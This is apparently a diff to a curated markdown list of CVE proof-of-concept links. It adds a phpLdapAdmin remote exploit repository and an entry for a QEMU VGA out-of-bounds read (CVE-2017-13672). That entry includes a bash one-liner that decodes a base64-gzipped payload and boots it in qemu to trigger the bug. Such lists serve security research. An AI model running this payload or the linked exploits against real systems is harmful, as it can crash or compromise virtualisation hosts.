@@ -124,6 +124,11 @@ Some CVEs PoCs repos on github or internet.
 * Oracle WebLogic WLS-WSAT Remote Code Execution Exploit: [CVE-2017-10271](https://github.com/kkirsche/CVE-2017-10271)
 * WebLogic Exploit: [CVE-2017-10271](https://github.com/c0mmand3rOpSec/CVE-2017-10271)
 * Talos Vulnerability Deep Dive: Sophos HitmanPro.Alert vulnerability -  [CVE-2018-3971](https://blog.talosintelligence.com/2018/11/TALOS-2018-0636.html)
+* [phpLdapAdmin multiple vulns](https://github.com/opsxcq/exploit-phpldapadmin-remote-dump): phpldapadmin remote exploit and vulnerable container.
+* QEMU: vga: OOB read access during display update: [CVE-2017-13672](https://twitter.com/David3141593/status/903284919803277312),
+'''bash
+$ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | base64 -d | gunzip > a && qemu-system-i386 -vga cirrus a
+''' 
 
 ## Additions
 
